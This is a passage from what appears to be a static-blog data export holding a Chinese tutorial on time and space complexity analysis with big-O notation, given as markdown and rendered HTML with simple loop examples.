complexity），简称<strong>时间复杂度</strong>。</p>\n\n<p>当 n 很大时，你可以把它想象成 10000、100000。而公式中的低阶、常量、系数三部分并不左右增长趋势，所以都可以忽略。我们只需要记录一个最大量级就可以了，如果用大 O 表示法表示刚讲的那两段代码的时间复杂度，就可以记为：T(n) = O(n)； T(n) = O(n<sup>2</sup>)。</p>\n\n## 时间复杂度分析\n\n1. 只关注循环执行次数最多的一段代码\n\n```js\nfunction cal(n) {\n  var sum = 0;\n  var i = 1;\n  for (; i <= n; ++i) {\n    sum = sum + 1;\n  }\n  return sum;\n}\n```\n\n以上代码总的时间复杂度就是 O(n)。\n\n2. 加法法则：总复杂度等于量级最大的那段代码的复杂度\n\n```js\nfunction cal(n) {\n  var sum_1 = 0;\n  var p = 1;\n  for (; p < 100; ++p) {\n    sum_1 = sum_1 + p;\n  }\n\n  var sum_2 = 0;\n  var q = 1;\n  for (; q < n; ++q) {\n    sum_2 = sum_2 + q;\n  }\n\n  var sum_3 = 0;\n  var i = 1;\n  var j = 1;\n  for (; i <= n; ++i) {\n    j = 1;\n    for (; j <= n; ++j) {\n      sum_3 = sum_3 + i * j;\n    }\n  }\n\n  return sum_1 + sum_2 + sum_3;\n}\n```\n\n<p>综合这三段代码的时间复杂度，我们取其中最大的量级。所以，整段代码的时间复杂度就为 O(n<sup>2</sup>)。也就是说：<strong>总的时间复杂度<strong><strong>就</strong></strong>等于量级最大的那段代码的时间复杂度</strong>。那我们将这个规律抽象成公式就是：</p>\n\n3. 乘法法则：嵌套代码的复杂度等于嵌套内外代码复杂度的乘积\n\n```js\nfunction cal(n) {\n  var ret = 0;\n  var i = 1;\n  for (; i < n; ++i) {\n    ret = ret + f(i);\n  }\n}\n\nfunction f(n) {\n  var sum = 0;\n  var i = 1;\n  for (; i < n; ++i) {\n    sum = sum + i;\n  }\n  return sum;\n}\n```\n\n<p>我们单独看 cal() 函数。假设 f() 只是一个普通的操作，那第 4～6 行的时间复杂度就是，T1(n) = O(n)。但 f() 函数本身不是一个简单的操作，它的时间复杂度是 T2(n) = O(n)，所以，整个 cal() 函数的时间复杂度就是，T(n) = T1(n) * T2(n) = O(n*n) = O(n<sup>2</sup>)。</p>\n\n## 几种常见时间复杂度实例分析\n\n![](normal.jpg)\n\n1. O(1)\n   O(1) 只是常量级时间复杂度的一种表示方法，并不是指只执行了一行代码。\n\n```js\nvar i = 8;\nvar j = 6;\nvar sum = i + j;\n```\n\n<p>总结一下，只要代码的执行时间不随 n 的增大而增长，这样代码的时间复杂度我们都记作 O(1)。或者说，<strong>一般<strong><strong>情况下</strong></strong>，只要算法中不存在循环语句、递归语句，即使有成千上万行的代码，其时间复杂度也是Ο(1)</strong>。</p>\n\n2. O(logn)、O(nlogn)\n   对数阶时间复杂度非常常见，同时也是最难分析的一种时间复杂度。如下代码：\n\n```js\nvar i = 1;\nwhile (i <= n) {\n  i = i * 2;\n}\n```\n\n一个个列出来，就是这个样子：\n![](log.jpg)\n\n<p>所以，我们只要知道 x 值是多少，就知道这行代码执行的次数了。通过 2<sup>x</sup>=n 求解 x 这个问题我们想高中应该就学过了，我就不多说了。x=log<sub>2</sub>n，所以，这段代码的时间复杂度就是 O(log<sub>2</sub>n)。</p>\n\n现在稍微改下：\n\n```js\nvar i = 1;\nwhile (i <= n) {\n  i = i * 3;\n}\n```\n\n这段代码的时间复杂度为 O(log<sub>3</sub>n)。\n\n<p>实际上，不管是以 2 为底、以 3 为底，还是以 10 为底，我们可以把所有对数阶的时间复杂度都记为 O(logn)。为什么呢？</p>\n\n<p>我们知道，对数之间是可以互相转换的，log<sub>3</sub>n 就等于 log<sub>3</sub>2 * log<sub>2</sub>n，所以 O(log<sub>3</sub>n) = O(C *  log<sub>2</sub>n)，其中 C=log<sub>3</sub>2 是一个常量。基于我们前面的一个理论：<strong>在采用大 O 标记复杂度的时候，可以忽略系数，即 O(Cf(n)) = O(f(n))</strong>。所以，O(log<sub>2</sub>n) 就等于 O(log<sub>3</sub>n)。因此，在对数阶时间复杂度的表示方法里，我们忽略对数的“底”，统一表示为 O(logn)。</p>\n\n<p>如果你理解了我前面讲的 O(logn)，那 O(nlogn) 就很容易理解了。还记得我们刚讲的乘法法则吗？如果一段代码的时间复杂度是 O(logn)，我们循环执行 n 遍，时间复杂度就是 O(nlogn) 了。而且，O(nlogn) 也是一种非常常见的算法时间复杂度。比如，归并排序、快速排序的时间复杂度都是 O(nlogn)。</p>\n\n3. O(m+n)、O(m\\*n)\n\n```js\nfunction cal(m, n) {\n  var sum_1 = 0;\n  var i = 1;\n  for (; i < m; ++i) {\n    sum_1 = sum_1 + i;\n  }\n\n  var sum_2 = 0;\n  var j = 1;\n  for (; j < n; ++j) {\n    sum_2 = sum_2 + j;\n  }\n\n  return sum_1 + sum_2;\n}\n```\n\n<p>从代码中可以看出，m 和 n 是表示两个数据规模。我们无法事先评估 m 和 n 谁的量级大，所以我们在表示复杂度的时候，就不能简单地利用加法法则，省略掉其中一个。所以，上面代码的时间复杂度就是 O(m+n)。</p>\n\n<p>针对这种情况，原来的加法法则就不正确了，我们需要将加法规则改为：T1(m) + T2(n) = O(f(m) + g(n))。但是乘法法则继续有效：T1(m)*T2(n) = O(f(m) * f(n))。</p>\n\n## 空间复杂度分析\n\n<p>前面我讲过，时间复杂度的全称是<strong>渐进时间复杂度</strong>，<strong>表示算法的执行时间与数据规模之间的增长关系</strong>。类比一下，空间复杂度全称就是<strong>渐进空间复杂度</strong>（asymptotic space complexity），<strong>表示算法的存储空间与数据规模之间的增长关系</strong>。</p>\n\n```js\nvoid print(int n) {\n  int i = 0;\n  int[] a = new int[n];\n  for (i; i <n; ++i) {\n    a[i] = i * i;\n  }\n\n  for (i = n-1; i >= 0; --i) {\n    print out a[i]\n  }\n}\n\n```\n\n<p>跟时间复杂度分析一样，我们可以看到，第 2 行代码中，我们申请了一个空间存储变量 i，但是它是常量阶的，跟数据规模 n 没有关系，所以我们可以忽略。第 3 行申请了一个大小为 n 的 int 类型数组，除此之外，剩下的代码都没有占用更多的空间，所以整段代码的空间复杂度就是 O(n)。</p>\n\n<p>我们常见的空间复杂度就是 O(1)、O(n)、O(n<sup>2</sup> )，像 O(logn)、O(nlogn) 这样的对数阶复杂度平时都用不到。而且，空间复杂度分析比时间复杂度分析要简单很多。所以，对于空间复杂度，掌握刚我说的这些内容已经足够了。</p>\n\n## 内容小结\n\n<p>复杂度也叫渐进复杂度，包括时间复杂度和空间复杂度，用来分析算法执行效率与数据规模之间的增长关系，可以粗略地表示，越高阶复杂度的算法，执行效率越低。常见的复杂度并不多，从低阶到高阶有：O(1)、O(logn)、O(n)、O(nlogn)、O(n<sup>2</sup> )。<strong>复杂度分析并不难，关键在于多练。</strong></p>\n\n另外还有四个时间复杂度知识可以进一步学习下：最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度。\n\n# 参考\n\n极客时间——数据结构与算法之美\n","slug":"数据结构与算法@复杂度分析","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d91b00azwovvftus5ahz","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>复杂度分析是学习算法的非常重要的部分，主要分为时间复杂度分析和空间复杂度分析。掌握大“O”表示法及几种常见时间复杂度实例分析。知道最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度和均摊时间复杂度。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"大-O-时间复杂度表示法\"><a href=\"#大-O-时间复杂度表示法\" class=\"headerlink\" title=\"大 O 时间复杂度表示法\"></a>大 O 时间复杂度表示法</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cal</span>(<span class=\"params\">n</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> j = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; i &lt;= n; ++i) &#123;</span><br><span class=\"line\">    j = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (; j &lt;= n; ++j) &#123;</span><br><span class=\"line\">      sum = sum + i * j;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>假如每个语句的执行时间是 unit_time，那么这段代码的总执行时间 T(n)是多少呢？</p>\n<p>第 2、3、4 行代码，每行都需要 1 个 unit_time 的执行时间，第 5、6 行代码循环执行了 n 遍，需要 2n <em> unit_time 的执行时间，第 7、8 行代码循环执行了 n<sup>2</sup>遍，所以需要 2n<sup>2</sup> </em> unit_time 的执行时间。所以，整段代码总的执行时间 T(n) = (2n<sup>2</sup>+2n+3)*unit_time。</p>\n\n<p>尽管我们不知道 unit_time 的具体值，但是通过这两段代码执行时间的推导过程，我们可以得到一个非常重要的规律，那就是，<strong>所有代码的执行时间 T(n) 与每行代码的执行次数 n 成正比</strong>。</p>\n\n<p>总结成一个公式如下：<br><img src=\"/数据结构与算法@复杂度分析/o.png\" alt=\"\"></p>\n<p>所以，第一个例子中的 T(n) = O(2n+2)，第二个例子中的 T(n) = O(2n<sup>2</sup>+2n+3)。这就是<strong>大 O 时间复杂度表示法</strong>。大 O 时间复杂度实际上并不具体表示代码真正的执行时间，而是表示<strong>代码执行时间随数据规模增长的变化趋势</strong>，所以，也叫作<strong>渐进时间复杂度</strong>（asymptotic time complexity），简称<strong>时间复杂度</strong>。</p>\n\n<p>当 n 很大时，你可以把它想象成 10000、100000。而公式中的低阶、常量、系数三部分并不左右增长趋势，所以都可以忽略。我们只需要记录一个最大量级就可以了，如果用大 O 表示法表示刚讲的那两段代码的时间复杂度，就可以记为：T(n) = O(n)； T(n) = O(n<sup>2</sup>)。</p>\n\n<h2 id=\"时间复杂度分析\"><a href=\"#时间复杂度分析\" class=\"headerlink\" title=\"时间复杂度分析\"></a>时间复杂度分析</h2><ol>\n<li>只关注循环执行次数最多的一段代码</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cal</span>(<span class=\"params\">n</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; i &lt;= n; ++i) &#123;</span><br><span class=\"line\">    sum = sum + <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>以上代码总的时间复杂度就是 O(n)。</p>\n<ol start=\"2\">\n<li>加法法则：总复杂度等于量级最大的那段代码的复杂度</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cal</span>(<span class=\"params\">n</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum_1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> p = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; p &lt; <span class=\"number\">100</span>; ++p) &#123;</span><br><span class=\"line\">    sum_1 = sum_1 + p;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum_2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> q = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; q &lt; n; ++q) &#123;</span><br><span class=\"line\">    sum_2 = sum_2 + q;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum_3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> j = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; i &lt;= n; ++i) &#123;</span><br><span class=\"line\">    j = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (; j &lt;= n; ++j) &#123;</span><br><span class=\"line\">      sum_3 = sum_3 + i * j;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum_1 + sum_2 + sum_3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>综合这三段代码的时间复杂度，我们取其中最大的量级。所以，整段代码的时间复杂度就为 O(n<sup>2</sup>)。也就是说：<strong>总的时间复杂度<strong><strong>就</strong></strong>等于量级最大的那段代码的时间复杂度</strong>。那我们将这个规律抽象成公式就是：</p>\n\n<ol start=\"3\">\n<li>乘法法则：嵌套代码的复杂度等于嵌套内外代码复杂度的乘积</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cal</span>(<span class=\"params\">n</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; i &lt; n; ++i) &#123;</span><br><span class=\"line\">    ret = ret + f(i);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">n</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; i &lt; n; ++i) &#123;</span><br><span class=\"line\">    sum = sum + i;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们单独看 cal() 函数。假设 f() 只是一个普通的操作，那第 4～6 行的时间复杂度就是，T1(n) = O(n)。但 f() 函数本身不是一个简单的操作，它的时间复杂度是 T2(n) = O(n)，所以，整个 cal() 函数的时间复杂度就是，T(n) = T1(n) <em> T2(n) = O(n</em>n) = O(n<sup>2</sup>)。</p>\n\n<h2 id=\"几种常见时间复杂度实例分析\"><a href=\"#几种常见时间复杂度实例分析\" class=\"headerlink\" title=\"几种常见时间复杂度实例分析\"></a>几种常见时间复杂度实例分析</h2><p><img src=\"/数据结构与算法@复杂度分析/normal.jpg\" alt=\"\"></p>\n<ol>\n<li>O(1)<br>O(1) 只是常量级时间复杂度的一种表示方法，并不是指只执行了一行代码。</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> i = <span class=\"number\">8</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> j = <span class=\"number\">6</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> sum = i + j;</span><br></pre></td></tr></table></figure>\n<p>总结一下，只要代码的执行时间不随 n 的增大而增长，这样代码的时间复杂度我们都记作 O(1)。或者说，<strong>一般<strong><strong>情况下</strong></strong>，只要算法中不存在循环语句、递归语句，即使有成千上万行的代码，其时间复杂度也是Ο(1)</strong>。</p>\n\n<ol start=\"2\">\n<li>O(logn)、O(nlogn)<br>对数阶时间复杂度非常常见，同时也是最难分析的一种时间复杂度。如下代码：</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> (i &lt;= n) &#123;</span><br><span class=\"line\">  i = i * <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>一个个列出来，就是这个样子：<br><img src=\"/数据结构与算法@复杂度分析/log.jpg\" alt=\"\"></p>\n<p>所以，我们只要知道 x 值是多少，就知道这行代码执行的次数了。通过 2<sup>x</sup>=n 求解 x 这个问题我们想高中应该就学过了，我就不多说了。x=log<sub>2</sub>n，所以，这段代码的时间复杂度就是 O(log<sub>2</sub>n)。</p>\n\n<p>现在稍微改下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> (i &lt;= n) &#123;</span><br><span class=\"line\">  i = i * <span class=\"number\">3</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这段代码的时间复杂度为 O(log<sub>3</sub>n)。</p>\n<p>实际上，不管是以 2 为底、以 3 为底，还是以 10 为底，我们可以把所有对数阶的时间复杂度都记为 O(logn)。为什么呢？</p>\n\n<p>我们知道，对数之间是可以互相转换的，log<sub>3</sub>n 就等于 log<sub>3</sub>2 <em> log<sub>2</sub>n，所以 O(log<sub>3</sub>n) = O(C </em>  log<sub>2</sub>n)，其中 C=log<sub>3</sub>2 是一个常量。基于我们前面的一个理论：<strong>在采用大 O 标记复杂度的时候，可以忽略系数，即 O(Cf(n)) = O(f(n))</strong>。所以，O(log<sub>2</sub>n) 就等于 O(log<sub>3</sub>n)。因此，在对数阶时间复杂度的表示方法里，我们忽略对数的“底”，统一表示为 O(logn)。</p>\n\n<p>如果你理解了我前面讲的 O(logn)，那 O(nlogn) 就很容易理解了。还记得我们刚讲的乘法法则吗？如果一段代码的时间复杂度是 O(logn)，我们循环执行 n 遍，时间复杂度就是 O(nlogn) 了。而且，O(nlogn) 也是一种非常常见的算法时间复杂度。比如，归并排序、快速排序的时间复杂度都是 O(nlogn)。</p>\n\n<ol start=\"3\">\n<li>O(m+n)、O(m*n)</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cal</span>(<span class=\"params\">m, n</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum_1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; i &lt; m; ++i) &#123;</span><br><span class=\"line\">    sum_1 = sum_1 + i;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum_2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> j = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; j &lt; n; ++j) &#123;</span><br><span class=\"line\">    sum_2 = sum_2 + j;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum_1 + sum_2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从代码中可以看出，m 和 n 是表示两个数据规模。我们无法事先评估 m 和 n 谁的量级大，所以我们在表示复杂度的时候，就不能简单地利用加法法则，省略掉其中一个。所以，上面代码的时间复杂度就是 O(m+n)。</p>\n\n<p>针对这种情况，原来的加法法则就不正确了，我们需要将加法规则改为：T1(m) + T2(n) = O(f(m) + g(n))。但是乘法法则继续有效：T1(m)<em>T2(n) = O(f(m) </em> f(n))。</p>\n\n<h2 id=\"空间复杂度分析\"><a href=\"#空间复杂度分析\" class=\"headerlink\" title=\"空间复杂度分析\"></a>空间复杂度分析</h2><p>前面我讲过，时间复杂度的全称是<strong>渐进时间复杂度</strong>，<strong>表示算法的执行时间与数据规模之间的增长关系</strong>。类比一下，空间复杂度全称就是<strong>渐进空间复杂度</strong>（asymptotic space complexity），<strong>表示算法的存储空间与数据规模之间的增长关系</strong>。</p>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> print(int n) &#123;</span><br><span class=\"line\">  int i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  int[] a = <span class=\"keyword\">new</span> int[n];</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (i; i &lt;n; ++i) &#123;</span><br><span class=\"line\">    a[i] = i * i;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (i = n<span class=\"number\">-1</span>; i &gt;= <span class=\"number\">0</span>; --i) &#123;</span><br><span class=\"line\">    print out a[i]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>跟时间复杂度分析一样，我们可以看到，第 2 行代码中，我们申请了一个空间存储变量 i，但是它是常量阶的，跟数据规模 n 没有关系，所以我们可以忽略。第 3 行申请了一个大小为 n 的 int 类型数组，除此之外，剩下的代码都没有占用更多的空间，所以整段代码的空间复杂度就是 O(n)。</p>\n\n<p>我们常见的空间复杂度就是 O(1)、O(n)、O(n<sup>2</sup> )，像 O(logn)、O(nlogn) 这样的对数阶复杂度平时都用不到。而且，空间复杂度分析比时间复杂度分析要简单很多。所以，对于空间复杂度，掌握刚我说的这些内容已经足够了。</p>\n\n<h2 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h2><p>复杂度也叫渐进复杂度，包括时间复杂度和空间复杂度，用来分析算法执行效率与数据规模之间的增长关系，可以粗略地表示，越高阶复杂度的算法，执行效率越低。常见的复杂度并不多，从低阶到高阶有：O(1)、O(logn)、O(n)、O(nlogn)、O(n<sup>2</sup> )。<strong>复杂度分析并不难，关键在于多练。</strong></p>\n\n<p>另外还有四个时间复杂度知识可以进一步学习下：最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——数据结构与算法之美</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>复杂度分析是学习算法的非常重要的部分，主要分为时间复杂度分析和空间复杂度分析。掌握大“O”表示法及几种常见时间复杂度实例分析。知道最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度和均摊时间复杂度。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"大-O-时间复杂度表示法\"><a href=\"#大-O-时间复杂度表示法\" class=\"headerlink\" title=\"大 O 时间复杂度表示法\"></a>大 O 时间复杂度表示法</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cal</span>(<span class=\"params\">n</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> j = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; i &lt;= n; ++i) &#123;</span><br><span class=\"line\">    j = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (; j &lt;= n; ++j) &#123;</span><br><span class=\"line\">      sum = sum + i * j;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>假如每个语句的执行时间是 unit_time，那么这段代码的总执行时间 T(n)是多少呢？</p>\n<p>第 2、3、4 行代码，每行都需要 1 个 unit_time 的执行时间，第 5、6 行代码循环执行了 n 遍，需要 2n <em> unit_time 的执行时间，第 7、8 行代码循环执行了 n<sup>2</sup>遍，所以需要 2n<sup>2</sup> </em> unit_time 的执行时间。所以，整段代码总的执行时间 T(n) = (2n<sup>2</sup>+2n+3)*unit_time。</p>\n\n<p>尽管我们不知道 unit_time 的具体值，但是通过这两段代码执行时间的推导过程，我们可以得到一个非常重要的规律，那就是，<strong>所有代码的执行时间 T(n) 与每行代码的执行次数 n 成正比</strong>。</p>\n\n<p>总结成一个公式如下：<br><img src=\"/数据结构与算法@复杂度分析/o.png\" alt=\"\"></p>\n<p>所以，第一个例子中的 T(n) = O(2n+2)，第二个例子中的 T(n) = O(2n<sup>2</sup>+2n+3)。这就是<strong>大 O 时间复杂度表示法</strong>。大 O 时间复杂度实际上并不具体表示代码真正的执行时间，而是表示<strong>代码执行时间随数据规模增长的变化趋势</strong>，所以，也叫作<strong>渐进时间复杂度</strong>（asymptotic time complexity），简称<strong>时间复杂度</strong>。</p>\n\n<p>当 n 很大时，你可以把它想象成 10000、100000。而公式中的低阶、常量、系数三部分并不左右增长趋势，所以都可以忽略。我们只需要记录一个最大量级就可以了，如果用大 O 表示法表示刚讲的那两段代码的时间复杂度，就可以记为：T(n) = O(n)； T(n) = O(n<sup>2</sup>)。</p>\n\n<h2 id=\"时间复杂度分析\"><a href=\"#时间复杂度分析\" class=\"headerlink\" title=\"时间复杂度分析\"></a>时间复杂度分析</h2><ol>\n<li>只关注循环执行次数最多的一段代码</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cal</span>(<span class=\"params\">n</span>) 